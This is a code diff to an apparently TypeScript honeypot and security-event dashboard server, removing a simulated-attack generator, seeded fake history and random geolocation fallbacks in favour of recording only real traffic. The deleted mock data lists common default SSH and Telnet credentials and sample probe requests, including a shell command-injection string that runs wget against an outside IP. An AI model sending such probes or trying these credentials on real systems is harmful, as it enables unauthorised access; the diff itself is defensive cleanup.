@@ -24,49 +24,6 @@ pool.on('error', (err) => {
   console.error('Unexpected Postgres pool error:', err);
 });
 
-// --- Pre-calculated Mock Geolocation database for realism & performance ---
-const LOCATIONS = [
-  { country: 'United States', city: 'Ashburn', lat: 39.0437, lng: -77.4875 },
-  { country: 'Germany', city: 'Frankfurt', lat: 50.1109, lng: 8.6821 },
-  { country: 'China', city: 'Beijing', lat: 39.9042, lng: 116.4074 },
-  { country: 'Brazil', city: 'São Paulo', lat: -23.5505, lng: -46.6333 },
-  { country: 'Russia', city: 'Moscow', lat: 55.7558, lng: 37.6173 },
-  { country: 'Netherlands', city: 'Amsterdam', lat: 52.3676, lng: 4.9041 },
-  { country: 'Singapore', city: 'Singapore', lat: 1.3521, lng: 103.8198 },
-  { country: 'South Korea', city: 'Seoul', lat: 37.5665, lng: 126.9780 },
-  { country: 'United Kingdom', city: 'London', lat: 51.5074, lng: -0.1278 },
-  { country: 'India', city: 'Bengaluru', lat: 12.9716, lng: 77.5946 },
-  { country: 'Japan', city: 'Tokyo', lat: 35.6762, lng: 139.6503 },
-  { country: 'Australia', city: 'Sydney', lat: -33.8688, lng: 151.2093 },
-  { country: 'France', city: 'Paris', lat: 48.8566, lng: 2.3522 },
-  { country: 'Canada', city: 'Toronto', lat: 43.6532, lng: -79.3832 },
-  { country: 'South Africa', city: 'Cape Town', lat: -33.9249, lng: 18.4241 },
-  { country: 'Sweden', city: 'Stockholm', lat: 59.3293, lng: 18.0686 },
-  { country: 'Poland', city: 'Warsaw', lat: 52.2297, lng: 21.0122 }
-];
-
-const SCANNER_IPS = [
-  '185.156.177.40', '193.32.248.112', '45.143.203.22', '85.209.11.89',
-  '198.51.100.41', '203.0.113.125', '141.98.81.33', '103.116.14.90',
-  '77.247.110.155', '61.177.173.14', '91.240.118.210', '185.65.135.5'
-];
-
-const CREDENTIALS = {
-  SSH: [
-    'root / admin', 'admin / 12345', 'support / support', 'pi / raspberry',
-    'ubnt / ubnt', 'user / password', 'root / 123456', 'admin / admin'
-  ],
-  TELNET: [
-    'admin / admin', 'root / root', 'guest / guest', 'tele / tele',
-    'admin / 1234', 'root / password', 'support / password'
-  ],
-  HTTP: [
-    'GET /.env', 'GET /wp-admin/index.php', 'POST /xmlrpc.php',
-    'GET /shell?cd+/tmp;wget+http://91.13.91.5', 'GET /cgi-bin/main.cgi',
-    'GET /phpmyadmin/', 'GET /actuator/gateway/routes', 'GET /robots.txt'
-  ]
-};
-
 interface ProwlerMetrics {
   total_nsg_checks: number;
   fails: number;
@@ -180,7 +137,9 @@ async function loadStateFromDb() {
     events = rows.map(rowToEvent);
     console.log(`Database loaded with ${events.length} logs.`);
   } else {
-    await seedDatabase();
+    // Fresh database: start empty. Only real traffic (Wazuh alerts, honeypot
+    // decoy captures) is ever recorded - no fabricated history.
+    events = [];
   }
 
   const settingsResult = await pool.query('SELECT * FROM settings WHERE id = 1');
@@ -220,56 +179,6 @@ async function loadStateFromDb() {
     source: row.source,
     scanned_at: new Date(row.scanned_at).toISOString()
   }));
-}
-
-async function seedDatabase() {
-  const seeded: AttackEvent[] = [];
-  const now = new Date();
-
-  // Seed about 80 points scattered across the last 24 hours
-  for (let i = 0; i < 80; i++) {
-    const hoursAgo = Math.floor(Math.random() * 24);
-    const time = new Date(now.getTime() - hoursAgo * 60 * 60 * 1000 - Math.random() * 60 * 60 * 1000);
-    const loc = LOCATIONS[Math.floor(Math.random() * LOCATIONS.length)];
-    const ip = SCANNER_IPS[Math.floor(Math.random() * SCANNER_IPS.length)];
-    const protoChoices: Array<'SSH' | 'TELNET' | 'HTTP'> = ['SSH', 'TELNET', 'HTTP'];
-    const protocol = protoChoices[Math.floor(Math.random() * protoChoices.length)];
-
-    let port = 2222;
-    if (protocol === 'TELNET') port = 2323;
-    if (protocol === 'HTTP') port = 8080;
-
-    const payloadList = CREDENTIALS[protocol];
-    const payload = payloadList[Math.floor(Math.random() * payloadList.length)];
-
-    seeded.push({
-      id: `seed-${Date.now()}-${i}-${Math.random().toString(36).substr(2, 5)}`,
-      timestamp: time.toISOString(),
-      ip,
-      port,
-      protocol,
-      payload,
-      source: 'generator',
-      country: loc.country,
-      city: loc.city,
-      lat: loc.lat,
-      lng: loc.lng
-    });
-  }
-
-  seeded.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
-
-  for (const e of seeded) {
-    await pool.query(
-      `INSERT INTO events (id, timestamp, ip, port, protocol, payload, country, city, lat, lng)
-       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
-       ON CONFLICT (id) DO NOTHING`,
-      [e.id, e.timestamp, e.ip, e.port, e.protocol, e.payload, e.country, e.city, e.lat, e.lng]
-    );
-  }
-
-  events = seeded;
-  console.log('Seeded database with historical honeypot records.');
 }
 
 // Adding an Incident, persisting it, and broadcasting
@@ -416,49 +325,6 @@ function requireBearerToken(expectedToken: string) {
 }
 const wazuhAuth = requireBearerToken(process.env.WAZUH_WEBHOOK_TOKEN || '');
 const prowlerAuth = requireBearerToken(process.env.PROWLER_WEBHOOK_TOKEN || '');
-
-// --- Active Simulated Security Traffic Generator ---
-let generatorTimer: NodeJS.Timeout | null = null;
-
-function resetGenerator() {
-  if (generatorTimer) clearInterval(generatorTimer);
-  if (settings.simulationSpeed === 'off') return;
-
-  let delay = 6000; // standard
-  if (settings.simulationSpeed === 'slow') delay = 12000;
-  if (settings.simulationSpeed === 'fast') delay = 2500;
-
-  generatorTimer = setInterval(() => {
-    const loc = LOCATIONS[Math.floor(Math.random() * LOCATIONS.length)];
-    // Randomize the IP octets a bit for distinct indicators
-    const ipBase = SCANNER_IPS[Math.floor(Math.random() * SCANNER_IPS.length)];
-    const ipParts = ipBase.split('.');
-    ipParts[3] = Math.floor(Math.random() * 254 + 1).toString();
-    const ip = ipParts.join('.');
-
-    const protocols: Array<'SSH' | 'TELNET' | 'HTTP'> = ['SSH', 'TELNET', 'HTTP'];
-    const protocol = protocols[Math.floor(Math.random() * protocols.length)];
-
-    let port = 2222;
-    if (protocol === 'TELNET') port = 2323;
-    if (protocol === 'HTTP') port = 8080;
-
-    const payloadList = CREDENTIALS[protocol];
-    const payload = payloadList[Math.floor(Math.random() * payloadList.length)];
-
-    insertEvent({
-      ip,
-      port,
-      protocol,
-      payload,
-      country: loc.country,
-      city: loc.city,
-      lat: loc.lat,
-      lng: loc.lng,
-      source: 'generator'
-    }).catch(err => console.error('Generator insertEvent failed:', err));
-  }, delay);
-}
 
 // --- Real TCP & HTTP Honeypot Socket Pools ---
 // Wrap each listener in try-catch blocks and add 'error' events to prevent any platform port collisions from halting app initialization.
@@ -795,12 +661,13 @@ app.post('/api/simulate', async (req, res) => {
     if (selectedProto === 'TELNET') port = 2323;
     if (selectedProto === 'HTTP') port = 8080;
 
-    const loc = LOCATIONS[Math.floor(Math.random() * LOCATIONS.length)];
-    const randomizedSuffix = Math.floor(Math.random() * 254 + 1).toString();
-    const sourceIP = host || `198.51.100.${randomizedSuffix}`;
-
-    const defaultPayloads = CREDENTIALS[selectedProto];
-    const selectedPayload = payload || defaultPayloads[Math.floor(Math.random() * defaultPayloads.length)];
+    // No invented defaults: the caller must say which host sent the hit.
+    if (!host) {
+      return res.status(400).json({ error: 'host is required' });
+    }
+    const sourceIP = String(host);
+    const selectedPayload = payload ? String(payload) : 'manual test hit';
+    const loc = await resolveDecoyGeo(sourceIP);
 
     const logged = await insertEvent({
       ip: sourceIP,
@@ -908,12 +775,11 @@ async function recordWazuhAlert(alert: any, source: AttackSource) {
       lng = real.lng;
     } else {
       // Public IP but the lookup itself failed (rate limit, network hiccup) -
-      // fall back to a random location only as a last resort, not by default.
-      const loc = LOCATIONS[Math.floor(Math.random() * LOCATIONS.length)];
-      country = loc.country;
-      city = loc.city;
-      lat = loc.lat;
-      lng = loc.lng;
+      // say so honestly instead of inventing a location.
+      country = 'Unknown';
+      city = 'Unknown';
+      lat = 0;
+      lng = 0;
     }
   }
 
@@ -1166,7 +1032,6 @@ app.post('/api/settings', async (req, res) => {
       [settings.simulationSpeed, settings.alertThreshold, settings.decoyProfile]
     );
 
-    resetGenerator();
     res.json({
       status: 'success',
       settings
@@ -1202,7 +1067,6 @@ async function startWebPipeline() {
 async function main() {
   await initSchema();
   await loadStateFromDb();
-  resetGenerator();
   startHoneypotListeners();
   await startWebPipeline();
 }
